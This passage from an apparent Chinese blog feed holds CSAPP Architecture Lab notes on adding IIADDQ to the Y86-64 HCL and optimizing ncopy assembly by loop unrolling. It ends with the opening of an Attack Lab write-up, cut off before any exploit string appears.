destination?</span><br><span class="line">word dstE = [</span><br><span class="line">	icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">	icode in &#123; IIRMOVQ, IOPQ,IIADDQ&#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the M destination?</span><br><span class="line">word dstM = [</span><br><span class="line">	icode in &#123; IMRMOVQ, IPOPQ &#125; : rA;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Execute Stage   ###################################</span><br><span class="line"></span><br><span class="line">## Select input A to ALU</span><br><span class="line">word aluA = [</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ,IIADDQ &#125; : valC;</span><br><span class="line">	icode in &#123; ICALL, IPUSHQ &#125; : -8;</span><br><span class="line">	icode in &#123; IRET, IPOPQ &#125; : 8;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU</span><br><span class="line">word aluB = [</span><br><span class="line">	icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		      IPUSHQ, IRET, IPOPQ,IIADDQ &#125; : valB;</span><br><span class="line">	icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function</span><br><span class="line">word alufun = [</span><br><span class="line">	icode == IOPQ : ifun;</span><br><span class="line">	1 : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated?</span><br><span class="line">bool set_cc = icode in &#123; IOPQ, IIADDQ&#125;;</span><br><span class="line"></span><br><span class="line">################ Memory Stage    ###################################</span><br><span class="line"></span><br><span class="line">## Set read control signal</span><br><span class="line">bool mem_read = icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal</span><br><span class="line">bool mem_write = icode in &#123; IRMMOVQ, IPUSHQ, ICALL&#125;;</span><br><span class="line"></span><br><span class="line">## Select memory address</span><br><span class="line">word mem_addr = [</span><br><span class="line">	icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ&#125; : valE;</span><br><span class="line">	icode in &#123; IPOPQ, IRET &#125; : valA;</span><br><span class="line">	# Other instructions don&#x27;t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select memory input data</span><br><span class="line">word mem_data = [</span><br><span class="line">	# Value from register</span><br><span class="line">	icode in &#123; IRMMOVQ, IPUSHQ &#125; : valA;</span><br><span class="line">	# Return PC</span><br><span class="line">	icode == ICALL : valP;</span><br><span class="line">	# Default: Don&#x27;t write anything</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine instruction status确定指令状态</span><br><span class="line">word Stat = [</span><br><span class="line">	imem_error || dmem_error : SADR;</span><br><span class="line">	!instr_valid: SINS;</span><br><span class="line">	icode == IHALT : SHLT;</span><br><span class="line">	1 : SAOK;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Program Counter Update ############################</span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at</span><br><span class="line"></span><br><span class="line">word new_pc = [</span><br><span class="line">	# Call.  Use instruction constant</span><br><span class="line">	icode == ICALL : valC;</span><br><span class="line">	# Taken branch.  Use instruction constant</span><br><span class="line">	icode == IJXX &amp;&amp; Cnd : valC;</span><br><span class="line">	# Completion of RET instruction.  Use value from stack</span><br><span class="line">	icode == IRET : valM;</span><br><span class="line">	# Default: Use incremented PC</span><br><span class="line">	1 : valP;</span><br><span class="line">];</span><br><span class="line">#/* $end seq-all-hcl */</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>修改完后需要通过该HCL文件构建SEQ仿真器（ssim）的新实例，然后对其进行测试：</p>
<ol>
<li>根据<code>seq-full.hcl</code>文件构建新的仿真器</li>
</ol>
<p>cd到seq文件夹中输入以下命令：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">make VERSION=full</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>如果你不含有<code>Tcl/Tk</code>，需要在<code>Makefile</code>中将对应行注释掉</p>
<p><strong>注意：</strong>若出现以下问题：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004054.png" alt="image-20240317235047306"></p>
<p>解决方法：在seq文件夹中打开ssim.c，ctrl+f查询matherr，将相关两行代码注释掉，继续执行<code>make VERSION=full</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004087.png" alt="image-20240317235212547"></p>
<ol start="2">
<li>在小的Y86-64程序中测试你的方法</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">./ssim -t ../y86-code/asumi.yo</span><br></pre></td></tr></table></figure>

<p>如果失败了，还要重新修改你的实现，若成功则类似于下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004118.png" alt="image-20240318000003947"></p>
<ol start="3">
<li>使用基准程序来测试你的方法</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">cd ../y86-code; make testssim</span><br></pre></td></tr></table></figure>

<p>这将在基准程序上运行ssim，并通过将结果处理器状态与高级ISA仿真中的状态进行比较来检查正确性。注意，这些程序均未测试添加的指令，只是确保你的方法没有为原始说明注入错误。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004151.png" alt="image-20240318000047663"></p>
<ol start="4">
<li>一旦可以正确执行基准测试程序，则应在<code>../ptest</code>中运行大量的回归测试</li>
</ol>
<ul>
<li>测试除了<code>iaddq</code>以外的所有指令</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">cd ../ptest; make SIM=../seq/ssim</span><br></pre></td></tr></table></figure>

<p>出现了大量的warning不用担心，关注结果即可！</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004185.png" alt="image-20240318000131353"></p>
<ul>
<li>测试我们实现的<code>iaddq</code>指令</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">cd ../ptest; make SIM=../seq/ssim TFLAGS=-i</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004223.png" alt="image-20240318000223494"></p>
<p>若关键信息都Succeed那么就代表这个对于IADDQ的描述是正确的，Part_B通关！</p>
<blockquote>
<p>这个warning烦了我两天，乱搞之中不知道搞了什么，连make都失败了，索性重头解压tar做了一遍</p>
</blockquote>
<h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><p>总览：</p>
<blockquote>
<p>这部分工作目录在 <code>sim/pipe</code> 下，题目给定了 ncopy 函数的 C 代码，这个函数和 Part A 的第三题差不多，将 src 数组复制到 dest 数组，并返回数组中的正数的总数。题目还给定了这个函数的 Y86-64 代码，并在文件 <code>pipe-full.hcl</code> 中实现了一个包含 <code>IIADDQ</code> 常量的 PIPE 。题目要求修改 [ncopy.ys]和 [pipe-full.hcl] ，使得 <code>ncopy.ys</code> 运行得尽可能快。</p>
</blockquote>
<p>测试命令(参考官方文档第八页)：</p>
<p>1、保证代码正确：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">./correctness.pl</span><br></pre></td></tr></table></figure>

<p>2、保证模拟器正确</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">cd ../y86-code; make testpsim</span><br><span class="line">cd ../ptest; make SIM=../pipe/psim TFLAGS=-i</span><br></pre></td></tr></table></figure>

<p>3、保证二者结合正确</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">./correctness.pl -p</span><br></pre></td></tr></table></figure>

<p>通过了上面的测试，才能保证代码和模拟器都OK。</p>
<p>使用<code>../misc/yas ncopy.ys</code> 生成ncopy.yo</p>
<p>使用<code>./check-len.pl &lt; ncopy.yo </code> 检测长度</p>
<p>使用 <code>unix&gt; make VERSION=full</code> 重建测试环境；</p>
<p>使用<code>make drivers</code> 生成ncopy.ys的测试程序</p>
<p>使用 <code>unix&gt; ./psim -t sdriver.yo</code> 和 <code>unix&gt; ./psim -t ldriver.yo</code> 分别测试small 4-element array和larger 63-element array<br>使用 <code>unix&gt; ./correctness.pl</code> 测试 <code>ncopy.ys</code> 代码是否正确；<br>使用 <code>unix&gt; ./benchmark.pl</code> 自动测试得到平均 CPE 。</p>
<p>最初用给定的代码测试得到平均 CPE 约为 15.18 。这里要拿满分平均 CPE 应在 7.5 以下。</p>
<h2 id="IADDQ优化"><a href="#IADDQ优化" class="headerlink" title="IADDQ优化"></a>IADDQ优化</h2><p>在hcl中仿照part B增加IADDQ指令，然后再ncopy.ys中把addq都改成IADDQ指令，删除不必要的将立即数放入寄存器的指令，得到CPE为12.7.</p>
<p>代码大致如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax		# count = 0;</span><br><span class="line">	andq %rdx,%rdx		# len &lt;= 0?</span><br><span class="line">	jle Done		# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop:	</span><br><span class="line">	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		# val &lt;= 0?</span><br><span class="line">	jle Npos		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos:	</span><br><span class="line">	iaddq $-1, %rdx		# len--</span><br><span class="line">	iaddq $8, %rdi		# src++</span><br><span class="line">	iaddq $8, %rsi		# dst++</span><br><span class="line">	andq %rdx,%rdx		# len &gt; 0?</span><br><span class="line">	jg Loop			# if so, goto Loop:</span><br></pre></td></tr></table></figure>

<h2 id="偷工减料"><a href="#偷工减料" class="headerlink" title="偷工减料"></a>偷工减料</h2><p>我们知道iaddq指令会顺便set_cc，所以可以省掉一个<code>andq %rdx,%rdx</code>指令，把<code>iaddq $-1, %rdx</code>指令移动到<code>jg loop</code>上面。然后跑一遍！</p>
<p><strong>60opts!!!</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403291338326.png" alt="image-20240329120506890"></p>
<p>但这是虚假的！用sdrivers测一下就会得到以下结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403291338450.png" alt="image-20240329120853674"></p>
<p>大脑瞬间宕机，思考好一会，发现自己在hcl里面没有对IADDQ改set_cc。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool set_cc = (E_icode == IOPQ	|| E_icode== IIADDQ) &amp;&amp; </span><br></pre></td></tr></table></figure>

<p>改完后再次运行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403291338505.png" alt="image-20240329121102637"></p>
<p>喜提零分！</p>
<blockquote>
<p>pipe-full.hcl要能过..&#x2F;y86-code 和 ..&#x2F;ptest的测试，尤其是这点，benchmark不检查对错，如果psim有问题，benchmark可能会得到很低的CPE，误以为自己得了满分。</p>
</blockquote>
<h2 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h2><h3 id="二路展开"><a href="#二路展开" class="headerlink" title="二路展开"></a>二路展开</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	iaddq $-2,%rdx</span><br><span class="line">	jl L0R1</span><br><span class="line">Loop1 :</span><br><span class="line">		mrmovq (%rdi),%r8</span><br><span class="line">		rmmovq %r8,(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop2</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop2:</span><br><span class="line">		mrmovq 0x8(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x8(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle step</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">step:</span><br><span class="line">		iaddq $0x10,%rdi</span><br><span class="line">		iaddq $0x10,%rsi</span><br><span class="line">		iaddq $-2,%rdx</span><br><span class="line">		jge Loop1</span><br><span class="line">L0R1:</span><br><span class="line">	iaddq $1,%rdx</span><br><span class="line">	je REM1 </span><br><span class="line">	ret</span><br><span class="line">REM1:</span><br><span class="line">	mrmovq (%rdi),%r8</span><br><span class="line">	rmmovq %r8,(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle Done </span><br><span class="line">	iaddq $1,%rax</span><br></pre></td></tr></table></figure>

<p>Average CPE 9.69</p>
<p>Score 16.3&#x2F;60.0</p>
<p>所以我们尝试多路展开，关于对余数的处理，我们可以采取多叉搜索树。</p>
<h3 id="十路展开"><a href="#十路展开" class="headerlink" title="十路展开"></a>十路展开</h3><p>对于余数[0~9]采取三叉搜索树，即L0R9分为L0R2和3和L4R9,L0R2又分为0，1，2，L4R9又分为L4R6,7,L8R9.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	iaddq $-10,%rdx</span><br><span class="line">	jl L0R9</span><br><span class="line">Loop1 :</span><br><span class="line">		mrmovq (%rdi),%r8</span><br><span class="line">		rmmovq %r8,(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop2</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop2:</span><br><span class="line">		mrmovq 0x8(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x8(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop3</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop3:</span><br><span class="line">		mrmovq 0x10(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x10(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop4</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop4:</span><br><span class="line">		mrmovq 0x18(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x18(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop5</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop5:</span><br><span class="line">		mrmovq 0x20(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x20(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop6</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop6:</span><br><span class="line">		mrmovq 0x28(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x28(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop7</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop7:</span><br><span class="line">		mrmovq 0x30(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x30(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop8</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop8:</span><br><span class="line">		mrmovq 0x38(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x38(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop9</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop9:</span><br><span class="line">		mrmovq 0x40(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x40(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle Loop10</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">Loop10:</span><br><span class="line">		mrmovq 0x48(%rdi),%r8</span><br><span class="line">		rmmovq %r8,0x48(%rsi)</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle step</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">step:</span><br><span class="line">		iaddq $0x50,%rdi</span><br><span class="line">		iaddq $0x50,%rsi</span><br><span class="line">		iaddq $-10,%rdx</span><br><span class="line">		jge Loop1</span><br><span class="line"># applying range checks to remainders</span><br><span class="line">L0R9:</span><br><span class="line">        iaddq   $7,%rdx         # Compare with 3 (len + 10 - 3)</span><br><span class="line">        jl      L0R2            # len &lt; 3</span><br><span class="line">        jg      L4R9            # len &gt; 3</span><br><span class="line">        je      Rem3            # len == 3</span><br><span class="line">L0R2:</span><br><span class="line">        iaddq   $2,%rdx         # Compare with 1 (len + 3 - 1)</span><br><span class="line">        je      Rem1            # len == 1</span><br><span class="line">        jg      Rem2            # len == 2</span><br><span class="line">        ret                     # len == 0</span><br><span class="line">L4R6:</span><br><span class="line">        iaddq   $2,%rdx         # Compare with 5 (len + 7 - 5)</span><br><span class="line">        jl      Rem4            # len == 4</span><br><span class="line">        je      Rem5            # len == 5</span><br><span class="line">        jg      Rem6            # len == 6</span><br><span class="line">L4R9:</span><br><span class="line">        iaddq   $-4,%rdx        # Compare with 7 (len + 3 - 7)</span><br><span class="line">        jl      L4R6            # len &lt; 7</span><br><span class="line">        je      Rem7            # len == 7</span><br><span class="line">L8R9:</span><br><span class="line">        iaddq   $-1,%rdx        # Compare with 8 (len + 7 - 8)</span><br><span class="line">        je      Rem8            # len == 8</span><br><span class="line"></span><br><span class="line"># dealing with remainders</span><br><span class="line">Rem9:</span><br><span class="line">        mrmovq 0x40(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x40(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem8</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem8:</span><br><span class="line">        mrmovq 0x38(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x38(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem7</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem7:</span><br><span class="line">        mrmovq 0x30(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x30(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem6</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem6:</span><br><span class="line">        mrmovq 0x28(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x28(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem5</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem5:</span><br><span class="line">        mrmovq 0x20(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x20(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem4</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem4:</span><br><span class="line">        mrmovq 0x18(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x18(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem3</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem3:</span><br><span class="line">        mrmovq 0x10(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x10(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem2</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem2:</span><br><span class="line">        mrmovq 0x8(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x8(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem1</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem1:</span><br><span class="line">        mrmovq (%rdi), %r8</span><br><span class="line">        rmmovq %r8, (%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Done</span><br><span class="line">        iaddq $1, %rax</span><br></pre></td></tr></table></figure>

<p><strong>ncopy length &#x3D; 988 bytes</strong></p>
<p><strong>Average CPE 8.39</strong></p>
<p><strong>Score 42.3&#x2F;60.0</strong></p>
<h2 id="戳气泡"><a href="#戳气泡" class="headerlink" title="戳气泡"></a>戳气泡</h2><p><code>Y86-64</code>处理器的流水线有 F(取指)、D(译码)、E(执行)、M(访存)、W(写回) 五个阶段，D 阶段才读取寄存器，M 阶段才读取对应内存值，注意我们在十路展开里面有大量的mr和rm对同一个寄存器进行操作，在中间有空余bubble，可以考虑用多个寄存器来存，来利用其中的bubble空余时间，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	iaddq $-10,%rdx</span><br><span class="line">	jl L0R9</span><br><span class="line">Loop10:</span><br><span class="line">                #取值</span><br><span class="line">		mrmovq (%rdi),%r8</span><br><span class="line">                mrmovq 0x8(%rdi),%r9</span><br><span class="line">                mrmovq 0x10(%rdi),%r10</span><br><span class="line">                mrmovq 0x18(%rdi),%r11</span><br><span class="line">                mrmovq 0x20(%rdi),%r12</span><br><span class="line">                mrmovq 0x28(%rdi),%r13</span><br><span class="line">                mrmovq 0x30(%rdi),%r14</span><br><span class="line">                mrmovq 0x38(%rdi),%rcx</span><br><span class="line">                mrmovq 0x40(%rdi),%rbx</span><br><span class="line">                mrmovq 0x48(%rdi),%rbp</span><br><span class="line">                #写值</span><br><span class="line">		rmmovq %r8,(%rsi)</span><br><span class="line">                rmmovq %r9,0x8(%rsi)</span><br><span class="line">                rmmovq %r10,0x10(%rsi)</span><br><span class="line">                rmmovq %r11,0x18(%rsi)</span><br><span class="line">                rmmovq %r12,0x20(%rsi)</span><br><span class="line">                rmmovq %r13,0x28(%rsi)</span><br><span class="line">                rmmovq %r14,0x30(%rsi)</span><br><span class="line">                rmmovq %rcx,0x38(%rsi)</span><br><span class="line">                rmmovq %rbx,0x40(%rsi)</span><br><span class="line">                rmmovq %rbp,0x48(%rsi)</span><br><span class="line">                #先判断一下</span><br><span class="line">		andq %r8,%r8</span><br><span class="line">		jle judge0</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge0:		</span><br><span class="line">		andq %r9,%r9</span><br><span class="line">		jle judge1</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge1:		</span><br><span class="line">		andq %r10,%r10</span><br><span class="line">		jle judge2</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge2:		</span><br><span class="line">		andq %r11,%r11</span><br><span class="line">		jle judge3</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge3:		</span><br><span class="line">		andq %r12,%r12</span><br><span class="line">		jle judge4</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge4:		</span><br><span class="line">		andq %r13,%r13</span><br><span class="line">		jle judge5</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge5:		</span><br><span class="line">		andq %r14,%r14</span><br><span class="line">		jle judge6</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge6:		</span><br><span class="line">		andq %rcx,%rcx</span><br><span class="line">		jle judge7</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge7:		</span><br><span class="line">		andq %rbx,%rbx</span><br><span class="line">		jle judge8</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">judge8:				</span><br><span class="line">		andq %rbp,%rbp</span><br><span class="line">		jle step</span><br><span class="line">		iaddq $1,%rax</span><br><span class="line">step:</span><br><span class="line">		iaddq $0x50,%rdi</span><br><span class="line">		iaddq $0x50,%rsi</span><br><span class="line">		iaddq $-10,%rdx</span><br><span class="line">		jge Loop10</span><br><span class="line"># applying range checks to remainders</span><br><span class="line">L0R9:</span><br><span class="line">        iaddq   $7,%rdx         # Compare with 3 (len + 10 - 3)</span><br><span class="line">        jl      L0R2            # len &lt; 3</span><br><span class="line">        jg      L4R9            # len &gt; 3</span><br><span class="line">        je      Rem3            # len == 3</span><br><span class="line">L0R2:</span><br><span class="line">        iaddq   $2,%rdx         # Compare with 1 (len + 3 - 1)</span><br><span class="line">        je      Rem1            # len == 1</span><br><span class="line">        jg      Rem2            # len == 2</span><br><span class="line">        ret                     # len == 0</span><br><span class="line">L4R6:</span><br><span class="line">        iaddq   $2,%rdx         # Compare with 5 (len + 7 - 5)</span><br><span class="line">        jl      Rem4            # len == 4</span><br><span class="line">        je      Rem5            # len == 5</span><br><span class="line">        jg      Rem6            # len == 6</span><br><span class="line">L4R9:</span><br><span class="line">        iaddq   $-4,%rdx        # Compare with 7 (len + 3 - 7)</span><br><span class="line">        jl      L4R6            # len &lt; 7</span><br><span class="line">        je      Rem7            # len == 7</span><br><span class="line">L8R9:</span><br><span class="line">        iaddq   $-1,%rdx        # Compare with 8 (len + 7 - 8)</span><br><span class="line">        je      Rem8            # len == 8</span><br><span class="line"># dealing with remainders</span><br><span class="line">Rem9:</span><br><span class="line">        mrmovq 0x40(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x40(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem8</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem8:</span><br><span class="line">        mrmovq 0x38(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x38(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem7</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem7:</span><br><span class="line">        mrmovq 0x30(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x30(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem6</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem6:</span><br><span class="line">        mrmovq 0x28(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x28(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem5</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem5:</span><br><span class="line">        mrmovq 0x20(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x20(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem4</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem4:</span><br><span class="line">        mrmovq 0x18(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x18(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem3</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem3:</span><br><span class="line">        mrmovq 0x10(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x10(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem2</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem2:</span><br><span class="line">        mrmovq 0x8(%rdi), %r8</span><br><span class="line">        rmmovq %r8, 0x8(%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Rem1</span><br><span class="line">        iaddq $1, %rax</span><br><span class="line">Rem1:</span><br><span class="line">        mrmovq (%rdi), %r8</span><br><span class="line">        rmmovq %r8, (%rsi)</span><br><span class="line">        andq %r8, %r8</span><br><span class="line">        jle Done</span><br><span class="line">        iaddq $1, %rax</span><br></pre></td></tr></table></figure>

<p>ncopy length &#x3D; 988 bytes</p>
<p>Average CPE     7.65<br>Score   57.1&#x2F;60.0</p>
<p>最后得分:<strong>57.1</strong>差不多就这样吧.</p>
<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这个lab做的挺草率的，书都没怎么看，几乎算是面向题目的学习，lab的难度也确实不高，最后partc就以57.1分收尾了，以后想折腾以后的事，感觉还是有不少能戳气泡，调整的空间，但现在3月29号，要去做字符串，图论，备战校赛了，lab先搁浅搁浅。累的时候再做做emmmm</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP的lab3-attacklab</title>
    <url>/CSAPP/lab3/2024/02/27/</url>
    <content><![CDATA[<blockquote>
<p>一个寒假没动,开学了,努努力把Attack Lab开盒了</p>
</blockquote>
<h1 id="Part-I-CI"><a href="#Part-I-CI" class="headerlink" title="Part I CI"></a>Part I CI</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><blockquote>
<p>CI: Code Injection Attacks</p>
</blockquote>
<p>测试下这个程序</p>
<p>注意我们在执行ctarget程序的时候默认是连接到cmu的服务器，但是我们不是cmu的学生所以连不上服务器也就无法执行代码，所以执行的时候要加命令行参数 -q 以阻止连接到服务器的行为。</p>
<p>输入以下命令运行ctarget</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">./ctarget -q</span><br></pre></td></tr></table></figure>

<p>(同理,用gdb ctarget时,要注意run要写成run -q,不然就会试图链接远程服务器,然后报以下错误)</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png" alt="image-20240229000718171"></p>
<p>随意的输入个string得知程序大致运行方式</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454085.png" alt="image-20240229000829319"></p>
<h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h2><p>然后我们在做实验之前一定要看的pdf文档告诉我们以下信息<br>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute<br>an existing procedure.<br>Function getbuf is called within CTARGET by a function test having the following C code:</p>
